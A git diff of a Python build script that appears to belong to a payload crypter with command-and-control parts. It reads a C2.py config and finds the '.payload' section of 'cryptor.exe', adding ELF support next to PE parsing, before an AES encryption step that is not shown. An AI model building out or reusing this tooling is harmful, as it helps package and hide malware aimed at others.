@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 # this file is responsible for encrypting the .payload section.
 #
 # Copyright (C) 2020  @Qu3b411
@@ -17,21 +18,17 @@
 #
 
 
-
-import pefile
 import os
 import sys
 import re
 import base64
 from Crypto.Cipher import AES
-
-pe = pefile.PE(sys.argv[1]+"/cryptor.exe")
-
+from sys import platform
 def LogPrompt(st):
     print ("\t"+os.path.basename(__file__)+">>\t"+st);
 
 LogPrompt("Opening C2.py...")
-with open("./SVR_SRC/c2.py","r") as f:
+with open("./SVR_SRC/C2.py","r") as f:
     lines = f.readlines();
     LogPrompt("Locating Information in C2.h...")
     for line in lines:
@@ -51,11 +48,23 @@ with open("./SVR_SRC/c2.py","r") as f:
 LogPrompt("Closing C2.py!")
 LogPrompt("Locating Section Attributes")
 stdo =sys.stdout;
-for section in pe.sections:
-    if section.Name.decode().rstrip('\x00') == ".payload":
-        SectionName = section.Name.decode().rstrip('\x00');
-        SectionOffset = section.PointerToRawData;
-        SectionSize = section.SizeOfRawData;
+
+if platform == "win32":
+    import pefile
+    pe = pefile.PE(sys.argv[1]+"/cryptor.exe")
+    for section in pe.sections:
+        if section.Name.decode().rstrip('\x00') == ".payload":
+            SectionName = section.Name.decode().rstrip('\x00');
+            SectionOffset = section.PointerToRawData;
+            SectionSize = section.SizeOfRawData;
+if platform == "linux":
+    from elftools.elf.elffile import ELFFile
+    with open(sys.argv[1]+"/cryptor.exe","rb+") as  f:
+        for sect in ELFFile(f).iter_sections():
+            if sect.name.rstrip("\x00") == ".payload":
+                SectionName = sect.name.rstrip("\x00")
+                SectionOffset = sect.header['sh_offset']
+                SectionSize = sect.header['sh_size']
 
 print("\t\tSection Name \tPhysical Offset\tSize Of Section...")
 print("\t\t"+SectionName+"\t"+hex(SectionOffset)+"\t\t\t"+hex(SectionSize));
